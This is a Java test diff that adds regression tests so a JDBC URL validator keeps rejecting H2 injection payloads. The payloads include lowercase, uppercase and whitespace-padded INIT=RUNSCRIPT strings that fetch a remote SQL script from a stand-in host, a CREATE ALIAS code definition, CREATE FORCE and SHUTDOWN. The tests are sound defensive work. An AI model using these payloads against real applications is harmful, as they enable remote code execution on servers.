@@ -79,4 +79,66 @@ public class JdbcUrlValidatorTest {
     public void acceptsNull() {
         JdbcUrlValidator.validate(null);
     }
+
+    /* ---- case / whitespace bypass class (locks the (?i) defense + untested branches) ---- */
+    //
+    // The validator's entire RCE defense is case-insensitive: the H2 sub-URL is
+    // detected via lower-cased contains("jdbc:h2:") and the dangerous tokens via
+    // (?i) regexes. Nothing locked that — every payload above is UPPERCASE — so a
+    // refactor that dropped the (?i) flags (or the lower-casing on the H2 gate)
+    // would silently reopen the admin-RCE with the suite still green. These pin
+    // the bypass class and the two previously-untested branches (CREATE FORCE,
+    // standalone RUNSCRIPT).
+
+    @Test
+    public void rejectsLowercaseH2InitRunscript() {
+        assertRejected("jdbc:h2:mem:x;init=runscript from 'http://e/p.sql'");
+    }
+
+    @Test
+    public void rejectsLowercaseH2CreateAlias() {
+        // No INIT= here, so this exercises the CREATE-ALIAS pattern itself, case-insensitively.
+        assertRejected("jdbc:h2:mem:x;create alias EXEC AS $$ String x() { return \"y\"; } $$");
+    }
+
+    @Test
+    public void rejectsUppercaseSchemeH2Init() {
+        // The H2 detection itself must be case-insensitive: an upper-cased scheme
+        // must not slip past the looksH2 gate (it lower-cases before contains()).
+        assertRejected("JDBC:H2:MEM:X;INIT=RUNSCRIPT FROM 'http://e/p.sql'");
+    }
+
+    @Test
+    public void rejectsH2InitWithWhitespaceAroundEquals() {
+        // `INIT\\s*=` tolerates padding — `INIT = RUNSCRIPT` must still be caught.
+        assertRejected("jdbc:h2:mem:x;INIT = RUNSCRIPT FROM 'http://e/p.sql'");
+    }
+
+    @Test
+    public void rejectsH2CreateForce() {
+        // CREATE FORCE is in the H2_CREATE_EXEC pattern but had no test.
+        assertRejected("jdbc:h2:mem:x;CREATE FORCE VIEW v AS SELECT 1");
+    }
+
+    @Test
+    public void rejectsH2StandaloneRunscript() {
+        // RUNSCRIPT is blocked anywhere (defence in depth), not only via INIT=.
+        assertRejected("jdbc:h2:mem:x;runscript from 'http://e/p.sql'");
+    }
+
+    @Test
+    public void rejectsLowercaseH2Shutdown() {
+        assertRejected("jdbc:h2:mem:x;shutdown");
+    }
+
+    private static void assertRejected(String url) {
+        try {
+            JdbcUrlValidator.validate(url);
+            fail("expected IllegalArgumentException for: " + url);
+        } catch (IllegalArgumentException expected) {
+            assertTrue(
+                    "rejection should identify an invalid JDBC URL, was: " + expected.getMessage(),
+                    expected.getMessage().toLowerCase().contains("jdbc url"));
+        }
+    }
 }
